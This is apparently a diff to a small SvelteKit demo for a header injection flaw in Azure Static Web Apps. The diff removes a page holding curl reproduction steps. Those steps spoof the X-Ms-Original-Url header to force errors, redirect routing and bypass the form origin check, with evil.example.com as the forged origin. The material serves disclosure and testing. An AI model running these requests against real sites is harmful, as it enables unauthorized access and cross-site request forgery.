@@ -4,46 +4,9 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>SWA Header Injection Demo</title>
+  %sveltekit.head%
 </head>
 <body>
   <div>%sveltekit.body%</div>
 </body>
 </html>
-src/routes/+page.svelte
-<h1>SWA x-ms-original-url Header Injection Demo</h1>
-
-<h2>Test Endpoints</h2>
-<ul>
-  <li><a href="/debug">/debug</a> — Shows what URL the backend sees (origin, pathname, search)</li>
-  <li><a href="/form-action">/form-action</a> — Form with POST action (has SvelteKit origin check)</li>
-</ul>
-
-<h2>Repro Steps (run from terminal)</h2>
-
-<h3>1. Confirm client header reaches backend</h3>
-<pre><code>curl -s \
-  -H "X-Ms-Original-Url: NOT_A_URL" \
-  "https://&lt;your-app&gt;.azurestaticapps.net/debug"</code></pre>
-<p>Expected if vulnerable: <code>500</code> error (invalid URL passed to <code>new Request()</code>)</p>
-
-<h3>2. Routing control via fragment terminator</h3>
-<pre><code>curl -s \
-  -H "X-Ms-Original-Url: https://x/debug#" \
-  "https://&lt;your-app&gt;.azurestaticapps.net/does-not-exist"</code></pre>
-<p>Expected if vulnerable: returns the /debug response even though the real path is /does-not-exist</p>
-
-<h3>3. Origin bypass on form POST</h3>
-<pre><code># Control — should get 403:
-curl -s -w "\n%&#123;http_code&#125;\n" -X POST \
-  -H "Origin: https://evil.example.com" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "name=test" \
-  "https://&lt;your-app&gt;.azurestaticapps.net/form-action?/submit"
-
-# Exploit — should get 200 if vulnerable:
-curl -s -w "\n%&#123;http_code&#125;\n" -X POST \
-  -H "Origin: https://evil.example.com" \
-  -H "X-Ms-Original-Url: https://evil.example.com/form-action?/submit#" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "name=test" \
-  "https://&lt;your-app&gt;.azurestaticapps.net/form-action?/submit"</code></pre>
